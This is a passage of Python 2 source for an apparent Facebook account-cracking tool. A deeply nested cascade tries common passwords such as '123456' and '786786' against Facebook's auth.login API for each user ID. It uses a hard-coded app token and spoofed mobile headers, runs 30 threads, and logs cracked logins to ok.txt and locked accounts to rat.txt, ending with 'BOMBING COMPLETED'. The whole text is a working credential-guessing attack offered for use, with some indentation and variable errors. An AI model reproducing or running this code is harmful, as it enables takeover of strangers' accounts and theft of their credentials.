																	cp.close()
																	cps.append(uid+pass7)
																else:
																	pass8 = name.lower().split(' ')[0] + name.lower().split(' ')[1]
																	api = 'https://b-api.facebook.com/method/auth.login'
																	params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass8, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
																	headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
																	data = requests.get(api, params=params, headers=headers_)
																	if "access_token" in data.text and "EAAA" in data.text:
																		print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		oks.append(uid+pass8)
																	else:
																		if "www.facebook.com" in data.json()['error_msg']:
																			print(" \033[1;33m[TJ] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("rat.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
																			cps.append(uid+pass8)
																		else:
																  			pass9 = "102030"
																  			api = 'https://b-api.facebook.com/method/auth.login'
																  			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass9, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
																  			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
																  			data = requests.get(api, params=params, headers=headers_)
																			if "access_token" in data.text and "EAAA" in data.text:
																  			    print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass9+"\033[0;97m")
																  			    ok = open("ok.txt", "a")
																  			    ok.write(uid+"|"+pass9+"\n")
																  			    ok.close()
																  			    oks.append(uid+pass9)
																			else:
																  			        if "www.facebook.com" in data.json()['error_msg']:
																  			                print(" \033[1;33m[TJ] "+uid+" | "+pass9+"\033[0;97m")
																  			                cp = open("rat.txt", "a")
																  			                cp.write(uid+"|"+pass9+"\n")
																  			                cp.close()
																  			                cps.append(uid+pass9)
																  			        else:		
																					pass10 = 223344
																					api = 'https://b-api.facebook.com/method/auth.login'
																					params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass10, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
																					headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
																					data = requests.get(api, params=params, headers=headers_)
																					if "access_token" in data.text and "EAAA" in data.text:
																						print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass10+"\033[0;97m")
																						ok = open("ok.txt", "a")
																						ok.write(uid+"|"+pass10+"\n")
																						ok.close()
																						oks.append(uid+pass10)
																  			 		else:
																  			        		if "www.facebook.com" in data.json()['error_msg']:
																							print(" \033[1;33m[TJ] "+uid+" | "+pass10+"\033[0;97m")
																							cp = open("rat.txt", "a")
																							cp.write(uid+"|"+pass10+"\n")
																							cp.close()
																							cps.append(uid+pass10)
																						else:
																							pass11 = "556677"
																							api = 'https://b-api.facebook.com/method/auth.login'
																							params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass11, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
																							headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
																							data = requests.get(api, params=params, headers=headers_)
																							if "access_token" in data.text and "EAAA" in data.text:
																								print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass11+"\033[0;97m")
																								ok = open("ok.txt", "a")
																								ok.write(uid+"|"+pass11+"\n")
																								ok.close()
																								oks.append(uid+pass11)
																							else:
																								if "www.facebook.com" in data.json()['error_msg']:
																									print(" \033[1;33m[TJ] "+uid+" | "+pass11+"\033[0;97m")
																									cp = open("rat.txt", "a")
																									cp.write(uid+"|"+pass11+"\n")
																									cp.close()
																									cps.append(uid+pass1)
																								else:
																									pass12 = "786786"
																									api = 'https://b-api.facebook.com/method/auth.login'
																									params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass12, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
																									headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
																									data = requests.get(api, params=params, headers=headers_)
																									if "access_token" in data.text and "EAAA" in data.text:
																										print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass12+"\033[0;97m")
																										ok = open("ok.txt", "a")
																										ok.write(uid+"|"+pass12+"\n")
																										ok.close()
																										oks.append(uid+pass12)
																									else:
																										if "www.facebook.com" in data.json()['error_msg']:
																											print(" \033[1;33m[TJ] "+uid+" | "+pass12+"\033[0;97m")
																											cp = open("rat.txt", "a")
																											cp.write(uid+"|"+pass12+"\n")
																											cp.close()
																											cps.append(uid+pass12)
																										else:
																											pass13 = "123456"
																											api = 'https://b-api.facebook.com/method/auth.login'
																											params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass13, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
																											headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
																											data = requests.get(api, params=params, headers=headers_)
																											if "access_token" in data.text and "EAAA" in data.text:
																												print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass13+"\033[0;97m")
																												ok = open("ok.txt", "a")
																												ok.write(uid+"|"+pass13+"\n")
																												ok.close()
																												oks.append(uid+pass13)
																											else:
																												if "www.facebook.com" in data.json()['error_msg']:
																													print(" \033[1;33m[TJ] "+uid+" | "+pass13+"\033[0;97m")
																													cp = open("rat.txt", "a")
																													cp.write(uid+"|"+pass13+"\n")
																													cp.close()
																													cps.append(uid+pass13)
																												else:
																													pass14 = "112233"
																													api = 'https://b-api.facebook.com/method/auth.login'
																													params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass14, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
																													headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
																													data = requests.get(api, params=params, headers=headers_)
																													if "access_token" in data.text and "EAAA" in data.text:
																														print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass14+"\033[0;97m")
																														ok = open("ok.txt", "a")
																														ok.write(uid+"|"+pass14+"\n")
																														ok.close()
																														oks.append(uid+pass14)
																													else:
																														if "www.facebook.com" in data.json()['error_msg']:
																															print(" \033[1;33m[TJ] "+uid+" | "+pass14+"\033[0;97m")
																															cp = open("rat.txt", "a")
																															cp.write(uid+"|"+pass14+"\n")
																															cp.close()
																															cps.append(uid+pass14)
																														else:
																															pass15 = "123356789"
																															api = 'https://b-api.facebook.com/method/auth.login'
																															params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass15, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
																															headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
																															data = requests.get(api, params=params, headers=headers_)
																															if "access_token" in data.text and "EAAA" in data.text:
																																print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass15+"\033[0;97m")
																																ok = open("ok.txt", "a")
																																ok.write(uid+"|"+pass15+"\n")
																																ok.close()
																																oks.append(uid+pass15)
																															else:
																																if "www.facebook.com" in data.json()['error_msg']:
																																	print(" \033[1;33m[TJ] "+uid+" | "+pass15+"\033[0;97m")
																																	cp = open("rat.txt", "a")
																																	cp.write(uid+"|"+pass15+"\n")
																																	cp.close()											
																																	cps.append(uid+pass15)
																																else:
																																	pass16 = "1234567890"
																																	api = 'https://b-api.facebook.com/method/auth.login'
																																	params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass16, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
																																	headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
																																	data = requests.get(api, params=params, headers=headers_)
																																	if "access_token" in data.text and "EAAA" in data.text:
																																		print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass16+"\033[0;97m")
																																		ok = open("ok.txt", "a")
																																		ok.write(uid+"|"+pass16+"\n")
																																		ok.close()
																																		oks.append(uid+pass16)
																																	else:
																																		if "www.facebook.com" in data.json()['error_msg']:
																																			print(" \033[1;33m[TJ] "+uid+" | "+pass16+"\033[0;97m")
																																			cp = open("rat.txt", "a")
																																			cp.write(uid+"|"+pass16+"\n")
																																			cp.close()
																																			cps.append(uid+pass16)
																																		else:
																																			pass17 = "123123"
																																			api = 'https://b-api.facebook.com/method/auth.login'
																																			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass17, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
																																			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
																																			data = requests.get(api, params=params, headers=headers_)
																																			if "access_token" in data.text and "EAAA" in data.text:
																																				print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass17+"\033[0;97m")
																																				ok = open("ok.txt", "a")
																																				ok.write(uid+"|"+pass17+"\n")
																																				ok.close()
																																				oks.append(uid+pass17)
																																			else:
																																				if "www.facebook.com" in data.json()['error_msg']:
																																					print(" \033[1;33m[TJ] "+uid+" | "+pass17+"\033[0;97m")
																																					cp = open("rat.txt", "a")
																																					cp.write(uid+"|"+pass17+"\n")
																																					cp.close()
																																					cps.append(uid+pass17)
																																				else:
																																					pass18 = "654321"
																																					api = 'https://b-api.facebook.com/method/auth.login'
																																					params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass18, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
																																					headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
																																					data = requests.get(api, params=params, headers=headers_)
																																					if "access_token" in data.text and "EAAA" in data.text:
																																						print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass18+"\033[0;97m")
																																						ok = open("ok.txt", "a")
																																						ok.write(uid+"|"+pass18+"\n")
																																						ok.close()
																																						oks.append(uid+pass18)
																																					else:
																																						if "www.facebook.com" in data.json()['error_msg']:
																																							print(" \033[1;33m[TJ] "+uid+" | "+pass18+"\033[0;97m")
																																							cp = open("rat.txt", "a")
																																							cp.write(uid+"|"+pass18+"\n")
																																							cp.close()
																																							cps.append(uid+pass18)
																																						else:
																																							pass19 = "987654321"
																																							api = 'https://b-api.facebook.com/method/auth.login'
																																							params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass19, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
																																							headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
																																							data = requests.get(api, params=params, headers=headers_)
																																							if "access_token" in data.text and "EAAA" in data.text:
																																								print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass19+"\033[0;97m")
																																								ok = open("ok.txt", "a")
																																								ok.write(uid+"|"+pass19+"\n")
																																								ok.close()
																																								oks.append(uid+pass19)
																																							else:
																																								if "www.facebook.com" in data.json()['error_msg']:
																																									print(" \033[1;33m[TJ] "+uid+" | "+pass19+"\033[0;97m")
																																									cp = open("rat.txt", "a")
																																									cp.write(uid+"|"+pass19+"\n")
																																									cp.close()
																																									cps.append(uid+pass19)
																																								else:
																																									pass20 = "121212"
																																									api = 'https://b-api.facebook.com/method/auth.login'
																																									params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass20, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
																																									headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
																																									data = requests.get(api, params=params, headers=headers_)
																																									if "access_token" in data.text and "EAAA" in data.text:
																																										print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass20+"\033[0;97m")
																																										ok = open("ok.txt", "a")
																																										ok.write(uid+"|"+pass20+"\n")
																																										ok.close()
																																										oks.append(uid+pass20)
																																									else:
																																										if "www.facebook.com" in data.json()['error_msg']:
																																											print(" \033[1;33m[TJ] "+uid+" | "+pass20+"\033[0;97m")
																																											cp = open("rat.txt", "a")
																																											cp.write(uid+"|"+pass20+"\n")
																																											cp.close()
																																											cps.append(uid+pass20)
		
												
										
										
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("")
	linex()
	print("")
	print("\033[92;1m BOMBING COMPLETED")
	print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: "+str(len(oks))+"/"+str(len(cps)))
	print("")
	linex()
	print("")
	raw_input("\033[93;1m PRESS ENTER TO BACK ")
	menu()

if __name__ == '__main__':
	main()
